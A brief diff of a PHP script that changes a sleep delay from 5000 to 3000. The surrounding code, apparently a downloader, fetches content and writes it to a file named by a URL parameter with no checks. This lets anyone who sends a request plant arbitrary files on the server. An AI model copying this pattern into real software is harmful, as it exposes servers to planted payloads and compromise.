@@ -37,7 +37,7 @@ if(isset($_GET['dw'])){
   $n=gcssl($v);
   $name=$_GET['n'];
   file_put_contents($name,$n);
-  sleep(5000);
+  sleep(3000);
     $cap="";
     if(isset($_GET['cap'])){
         $cap=$_GET['cap'];
